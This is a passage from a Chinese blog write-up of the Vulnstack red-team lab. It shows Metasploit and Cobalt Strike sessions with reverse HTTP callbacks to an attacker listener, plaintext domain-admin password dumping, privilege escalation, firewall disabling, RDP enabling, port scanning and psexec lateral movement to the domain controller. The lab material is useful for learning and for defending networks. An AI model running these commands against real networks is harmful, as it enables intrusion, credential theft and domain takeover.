Backgrounding session <span class=\"hljs-number\">1.</span>..\nmsf6 exploit(multi/handler) > use exploit/windows/local/payload_inject \nmsf6 exploit(windows/local/payload_inject) > <span class=\"hljs-built_in\">set</span> payload windows/meterpreter/reverse_http\nmsf6 exploit(windows/local/payload_inject) > <span class=\"hljs-built_in\">set</span> lport <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.111</span><span class=\"hljs-number\">.150</span>\nmsf6 exploit(windows/local/payload_inject) > <span class=\"hljs-built_in\">set</span> lport <span class=\"hljs-number\">80</span>\nmsf6 exploit(windows/local/payload_inject) > <span class=\"hljs-built_in\">set</span> disablepayloadhandler true \nmsf6 exploit(windows/local/payload_inject) > <span class=\"hljs-built_in\">set</span> prependmigrate true \nmsf6 exploit(windows/local/payload_inject) > <span class=\"hljs-built_in\">set</span> session <span class=\"hljs-number\">1</span>\nmsf6 exploit(windows/local/payload_inject) > run\n[*] Running module against WEB\n[*] Spawned Notepad process <span class=\"hljs-number\">3584</span>\n[*] Injecting payload into <span class=\"hljs-number\">3584</span>\n[*] Preparing <span class=\"hljs-string\">'windows/meterpreter/reverse_http'</span> <span class=\"hljs-keyword\">for</span> PID <span class=\"hljs-number\">3584</span>\n</code></pre>\n</li>\n<li>\n<p>然后回到CS就可以看到已经将主机派生过来了</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image25.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n<h3>内网信息收寻</h3>\n<ol>\n<li>\n<p>网络配置信息</p>\n<pre><code class=\"hljs language-python\">C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain>ipconfig\nWindows IP Configuration\nEthernet adapter  <span class=\"hljs-number\">2</span>:\n   Connection-specific DNS Suffix  . : \n   Link-local IPv6 Address . . . . . : fe80::d153:9eef:2b9e:1c80%<span class=\"hljs-number\">13</span>\n   IPv4 Address. . . . . . . . . . . : <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.80</span>\n   Subnet Mask . . . . . . . . . . . : <span class=\"hljs-number\">255.255</span><span class=\"hljs-number\">.255</span><span class=\"hljs-number\">.0</span>\n   Default Gateway . . . . . . . . . : <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.1</span>\nEthernet adapter :\n   Connection-specific DNS Suffix  . : \n   Link-local IPv6 Address . . . . . : fe80::<span class=\"hljs-number\">2836</span>:b233:<span class=\"hljs-number\">6919</span>:8d8a%<span class=\"hljs-number\">11</span>\n   IPv4 Address. . . . . . . . . . . : <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.111</span><span class=\"hljs-number\">.80</span>\n   Subnet Mask . . . . . . . . . . . : <span class=\"hljs-number\">255.255</span><span class=\"hljs-number\">.255</span><span class=\"hljs-number\">.0</span>\n   Default Gateway . . . . . . . . . : <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.111</span><span class=\"hljs-number\">.1</span>\n</code></pre>\n<p>外网网段<code>192.168.111.0</code> ，内网网段<code>10.10.10.0</code></p>\n</li>\n<li>\n<p>进程信息</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># ps</span>\n<span class=\"hljs-number\">2740</span>  <span class=\"hljs-number\">2120</span>  360Tray.exe                   x86   <span class=\"hljs-number\">1</span>        DE1AY\\Administrator           C:\\Program Files (x86)\\<span class=\"hljs-number\">360</span>\\360Safe\\safemon\\360Tray.exe\n</code></pre>\n<p>发现安装了<code>360</code></p>\n</li>\n<li>\n<p>主机信息</p>\n<pre><code class=\"hljs language-python\">meterpreter > sysinfo\nComputer        : WEB\nOS              : Windows Server <span class=\"hljs-number\">2008</span> R2 (<span class=\"hljs-number\">6.1</span> Build <span class=\"hljs-number\">7601</span>, Service Pack <span class=\"hljs-number\">1</span>).\nArchitecture    : x64\nSystem Language : zh_CN\nDomain          : DE1AY\nLogged On Users : <span class=\"hljs-number\">8</span>\nMeterpreter     : x86/windows\n</code></pre>\n<p>发现存在域<code>DE1AY</code></p>\n</li>\n<li>\n<p>查看域详细信息</p>\n<pre><code class=\"hljs language-python\">beacon> shell net config workstation\n[*] Tasked beacon to run: net config workstation\n[+] host called home, sent: <span class=\"hljs-number\">53</span> <span class=\"hljs-built_in\">bytes</span>\n[+] received output:\n计算机名                     \\\\WEB\n计算机全名                   WEB.de1ay.com\n用户名                       Administrator\n\n工作站正运行于               \n\tNetBT_Tcpip_{D7E14072-49B9-45D3-BA8C-7955E6146CC2} (000C29ACFAFB)\n\tNetBT_Tcpip_{AD80CD23-D97F-<span class=\"hljs-number\">4814</span>-A715-9248D845EA0F} (000C29ACFA05)\n\n软件版本                     Windows Server <span class=\"hljs-number\">2008</span> R2 Standard\n\n工作站域                     DE1AY\n工作站域 DNS 名称            de1ay.com\n登录域                       DE1AY\n</code></pre>\n<p>域为<code>de1ay.com</code></p>\n</li>\n<li>\n<p>查看本机用户（本机以及域用户）</p>\n<pre><code class=\"hljs language-python\">C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain>net user    \nnet user\n\nUser accounts <span class=\"hljs-keyword\">for</span> \\\\WEB\n\n-------------------------------------------------------------------------------\nAdministrator            de1ay                    Guest                    \nThe command completed successfully.\n<span class=\"hljs-comment\"># 查看域用户被拒绝</span>\nC:\\Oracle\\Middleware\\user_projects\\domains\\base_domain>net user /domain\nnet user /domain\nThe request will be processed at a domain controller <span class=\"hljs-keyword\">for</span> domain de1ay.com.\n\nSystem error <span class=\"hljs-number\">5</span> has occurred.\n\nAccess <span class=\"hljs-keyword\">is</span> denied.\n</code></pre>\n</li>\n<li>\n<p>查看域中主机，也是权限不足</p>\n<pre><code class=\"hljs language-python\">C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain>net group <span class=\"hljs-string\">\"domain computers\"</span> /domain\nThe request will be processed at a domain controller <span class=\"hljs-keyword\">for</span> domain de1ay.com.\n\nSystem error <span class=\"hljs-number\">5</span> has occurred.\n\nAccess <span class=\"hljs-keyword\">is</span> denied.\n</code></pre>\n</li>\n<li>\n<p>查看ARP列表</p>\n<pre><code class=\"hljs language-python\">meterpreter > arp -a\n\nARP cache\n=========\n\n    IP address       MAC address        Interface\n    ----------       -----------        ---------\n    <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.1</span>       <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:c0:<span class=\"hljs-number\">00</span>:01  Intel(R) PRO/<span class=\"hljs-number\">1000</span> MT Network Connection <span class=\"hljs-comment\">#2</span>\n    <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.10</span>      <span class=\"hljs-number\">00</span>:0c:<span class=\"hljs-number\">29</span>:9c:<span class=\"hljs-number\">85</span>:b6  Intel(R) PRO/<span class=\"hljs-number\">1000</span> MT Network Connection <span class=\"hljs-comment\">#2</span>\n    <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.201</span>     <span class=\"hljs-number\">00</span>:0c:<span class=\"hljs-number\">29</span>:ad:ee:c1  Intel(R) PRO/<span class=\"hljs-number\">1000</span> MT Network Connection <span class=\"hljs-comment\">#2</span>\n    <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.255</span>     ff:ff:ff:ff:ff:ff  Intel(R) PRO/<span class=\"hljs-number\">1000</span> MT Network Connection <span class=\"hljs-comment\">#2</span>\n    <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.111</span><span class=\"hljs-number\">.1</span>    <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:c0:<span class=\"hljs-number\">00</span>:08  Intel(R) PRO/<span class=\"hljs-number\">1000</span> MT Network Connection\n    <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.111</span><span class=\"hljs-number\">.150</span>  <span class=\"hljs-number\">00</span>:0c:<span class=\"hljs-number\">29</span>:de:<span class=\"hljs-number\">14</span>:<span class=\"hljs-number\">88</span>  Intel(R) PRO/<span class=\"hljs-number\">1000</span> MT Network Connection\n    <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.111</span><span class=\"hljs-number\">.255</span>  ff:ff:ff:ff:ff:ff  Intel(R) PRO/<span class=\"hljs-number\">1000</span> MT Network Connection\n    <span class=\"hljs-number\">224.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.22</span>       <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>  Software Loopback Interface <span class=\"hljs-number\">1</span>\n    <span class=\"hljs-number\">224.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.22</span>       01:<span class=\"hljs-number\">00</span>:5e:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">16</span>  Intel(R) PRO/<span class=\"hljs-number\">1000</span> MT Network Connection\n    <span class=\"hljs-number\">224.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.22</span>       01:<span class=\"hljs-number\">00</span>:5e:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">16</span>  Intel(R) PRO/<span class=\"hljs-number\">1000</span> MT Network Connection <span class=\"hljs-comment\">#2</span>\n    <span class=\"hljs-number\">224.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.252</span>      01:<span class=\"hljs-number\">00</span>:5e:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:fc  Intel(R) PRO/<span class=\"hljs-number\">1000</span> MT Network Connection\n    <span class=\"hljs-number\">224.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.252</span>      01:<span class=\"hljs-number\">00</span>:5e:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:fc  Intel(R) PRO/<span class=\"hljs-number\">1000</span> MT Network Connection <span class=\"hljs-comment\">#2</span>\n</code></pre>\n<p>发现内网主机 <code>10</code>，<code>201</code></p>\n</li>\n</ol>\n<h3>CS抓取kiwi抓取密码及web主机提权</h3>\n<ol>\n<li>\n<p>CS抓取明文密码</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image26.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-python\">kerberos :\t\n\t * Username : Administrator <span class=\"hljs-comment\"># 大概率是域管理员</span>\n\t * Domain   : de1ay.com\n\t * Password : 1qaz@WSX\n</code></pre>\n<p>得到密码<code>1qaz@WSX</code> ，很多用户（<code>de1ay</code>,<code>mssql</code>）的密码都是这个，扫描到主机后可以横向移动</p>\n</li>\n<li>\n<p>之前在MSF提权不成功，尝试在CS提权</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image27.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-python\">beacon> elevate svc-exe HTTP-<span class=\"hljs-number\">80</span>\n[*] Tasked beacon to run windows/beacon_http/reverse_http (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.111</span><span class=\"hljs-number\">.150</span>:<span class=\"hljs-number\">80</span>) via Service Control Manager (\\\\<span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>\\ADMIN$\\722628d.exe)\n[+] host called home, sent: <span class=\"hljs-number\">313305</span> <span class=\"hljs-built_in\">bytes</span>\n[+] received output:\nStarted service 722628d on .\n</code></pre>\n<p>提权成功，多出来一个会话，是<code>system</code>权限的</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image28.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n<h3>web主机远程桌面</h3>\n<ol>\n<li>\n<p>关闭防火墙（提权后第一件要做的事）</p>\n<pre><code class=\"hljs language-python\">beacon> shell netsh advfirewall <span class=\"hljs-built_in\">set</span> allprofiles state off\n[*] Tasked beacon to run: netsh advfirewall <span class=\"hljs-built_in\">set</span> allprofiles state off\n[+] host called home, sent: <span class=\"hljs-number\">74</span> <span class=\"hljs-built_in\">bytes</span>\n确定。\n</code></pre>\n</li>\n<li>\n<p>注册表开启远程桌面</p>\n<pre><code class=\"hljs language-python\">beacon> shell REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal<span class=\"hljs-string\">\" \"</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class=\"hljs-number\">00000000</span> /f\n[*] Tasked beacon to run: REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal<span class=\"hljs-string\">\" \"</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class=\"hljs-number\">00000000</span> /f\n[+] host called home, sent: <span class=\"hljs-number\">144</span> <span class=\"hljs-built_in\">bytes</span>\n[+] received output:\n操作成功完成\n</code></pre>\n</li>\n<li>\n<p>连接远程桌面</p>\n<pre><code class=\"hljs language-python\">proxychains rdesktop <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.111</span><span class=\"hljs-number\">.80</span> -p 1qaz@WSX -u administrator\n</code></pre>\n<p>登录 <code>de1ay\\administrator</code> 时，需要更改新密码，我们将它修改为<code>Aa118811</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image29.png\" alt=\"image.png\"></p>\n<p>登陆成功</p>\n</li>\n<li>\n<p>在里边进行信息收集</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image30.png\" alt=\"image.png\"></p>\n<p>得到域成员 <code>PC,WEB</code>以及域控<code>DC</code> ，但是不知道<code>IP</code></p>\n</li>\n</ol>\n<h3>使用CS进行端口扫描</h3>\n<p>由于<code>CS</code>上目标只能发现WEB主机一台，没发现域内别的主机渗透不下去，也不能进行横向移动</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image31.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-python\">beacon> portscan <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.255</span> <span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">1024</span>,<span class=\"hljs-number\">3389</span>,<span class=\"hljs-number\">5000</span>-<span class=\"hljs-number\">6000</span> arp <span class=\"hljs-number\">1024</span>\n[*] Tasked beacon to scan ports <span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">1024</span>,<span class=\"hljs-number\">3389</span>,<span class=\"hljs-number\">5000</span>-<span class=\"hljs-number\">6000</span> on <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.255</span>\n[+] host called home, sent: <span class=\"hljs-number\">75365</span> <span class=\"hljs-built_in\">bytes</span>\n[+] received output:\n(ARP) Target <span class=\"hljs-string\">'10.10.10.80'</span> <span class=\"hljs-keyword\">is</span> alive. <span class=\"hljs-number\">00</span>-0C-<span class=\"hljs-number\">29</span>-AC-FA-05\n(ARP) Target <span class=\"hljs-string\">'10.10.10.201'</span> <span class=\"hljs-keyword\">is</span> alive. <span class=\"hljs-number\">00</span>-0C-<span class=\"hljs-number\">29</span>-AD-EE-C1\n(ARP) Target <span class=\"hljs-string\">'10.10.10.254'</span> <span class=\"hljs-keyword\">is</span> alive. <span class=\"hljs-number\">00</span>-<span class=\"hljs-number\">50</span>-<span class=\"hljs-number\">56</span>-E7-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">69</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.201</span>:<span class=\"hljs-number\">3389</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.201</span>:<span class=\"hljs-number\">139</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.201</span>:<span class=\"hljs-number\">135</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.80</span>:<span class=\"hljs-number\">3389</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.80</span>:<span class=\"hljs-number\">139</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.80</span>:<span class=\"hljs-number\">135</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.80</span>:<span class=\"hljs-number\">80</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">5985</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">3389</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">636</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">593</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">464</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">389</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">139</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">135</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">88</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">53</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">5357</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">5040</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">3389</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">912</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">902</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">139</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">135</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">445</span>\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.10</span>:<span class=\"hljs-number\">445</span> (platform: <span class=\"hljs-number\">500</span> version: <span class=\"hljs-number\">6.3</span> name: DC domain: DE1AY)\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.80</span>:<span class=\"hljs-number\">445</span> (platform: <span class=\"hljs-number\">500</span> version: <span class=\"hljs-number\">6.1</span> name: WEB domain: DE1AY)\n<span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.201</span>:<span class=\"hljs-number\">445</span> (platform: <span class=\"hljs-number\">500</span> version: <span class=\"hljs-number\">6.1</span> name: PC domain: DE1AY)\nScanner module <span class=\"hljs-keyword\">is</span> complete\n</code></pre>\n<p>扫出来主机<code>10.10.10.10</code>以及<code>10.10.10.201</code>,<code>10.10.10.80</code>是web主机，并且都扫描出了<code>445</code>端口，并且都开启<code>3389</code>端口</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image32.png\" alt=\"image.png\"></p>\n<p>CS的目标主机也发现了，DC是<code>10.10.10.10</code>，PC是<code>10.10.10.201</code></p>\n<h3>横向移动</h3>\n<ol>\n<li>\n<p>因为域内所有主机都开启<code>445</code>端口，所以我们创建一个SMB监听器来进行横向</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image33.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>在<code>CS</code>再抓一次明文密码，因为我们之前登录远程桌面时修改了<code>de1ay/administrator</code>的密码</p>\n</li>\n<li>\n<p>进行横向，右键<code>DC</code>选择<code>psexec</code> ，然后选择刚刚创建<code>SMB</code>监听器，点击<code>Launch</code></p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image34.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-python\">beacon> jump psexec DC SMB-<span class=\"hljs-number\">1</span>\n[*] Tasked beacon to run windows/beacon_bind_pipe (\\\\.\\pipe\\test) on DC via Service Control Manager (\\\\DC\\ADMIN$\\eb3da6e.exe)\n[+] host called home, sent: <span class=\"hljs-number\">313378</span> <span class=\"hljs-built_in\">bytes</span>\n[+] Impersonated DE1AY.COM\\administrator (netonly)\n[+] received output:\nStarted service eb3da6e on DC\n[+] established link to child beacon: <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.10</span><span class=\"hljs-number\">.10</span>\n</code></pre>\n<p>上线成功！！拿下DC</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image35.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>继续拿下<code>PC</code> ，和上面一样的操操作</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image36.png\" alt=\"image.png\"></p>\n<p>横向成功，拿下了</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image37.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n<h3>不进行横向利用3389</h3>\n<ol>\n<li>\n<p>上面内网端口扫描发现所有主机都开启可<code>3389</code>端口</p>\n</li>\n<li>\n<p>结合我们上面使用kiwi抓取的明文密码，可以直接登陆上去</p>\n</li>\n<li>\n<p>使用之前开启远程桌面的<code>web</code>主机作为跳板</p>\n</li>\n<li>\n<p>连接远程桌面，在web主机里面远程<code>DC</code>以及<code>PC</code>即可</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image38.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n<h3>还可以使用永恒之蓝漏洞</h3>\n<p>不写了</p>\n<h2>黄金票据（权限维持）</h2>\n<p>看我第一篇红日靶场的文章即可，主要收集<code>krbtgt</code>账户的<code>HTLM</code>的<code>HASH</code> ，以及域管理员的<code>SID</code> ，域的名称，随便一个账户即可构造黄金票据</p>","title":"Vulnstack - ATT&CK红队评估实战靶场(二)","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["Vulnstack","Windows靶机","综合靶场"],"categories":"靶机"},"recentPosts":[{"id":"PWN - 基本ROP","title":"PWN - 基本ROP","date":"2025-06-14","isEncrypted":false,"year":"2025","month":"06","day":"14"},{"id":"HackTheBoxMachine - Cap","title":"HackTheBox - Machine - Cap","date":"2025-06-11","isEncrypted":false,"year":"2025","month":"06","day":"11"},{"id":"Personalsunset","title":"Personal - sunset","date":"2025-06-10","isEncrypted":true,"year":"2025","month":"06","day":"10"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Season8 - TombWatcher","date":"2025-06-08","isEncrypted":true,"year":"2025","month":"06","day":"08"},{"id":"HackTheBoxMachine - Bucket","title":"HackTheBox - Machine - Bucket","date":"2025-06-06","isEncrypted":false,"year":"2025","month":"06","day":"06"},{"id":"HackTheBoxMachine -Support","title":"HackTheBox - Machine - Support","date":"2025-06-05","isEncrypted":false,"year":"2025","month":"06","day":"05"},{"id":"HackTheBoxMachine - Hospital","title":"HackTheBox - Machine - Hospital","date":"2025-06-04","isEncrypted":false,"year":"2025","month":"06","day":"04"}]},"__N_SSG":true}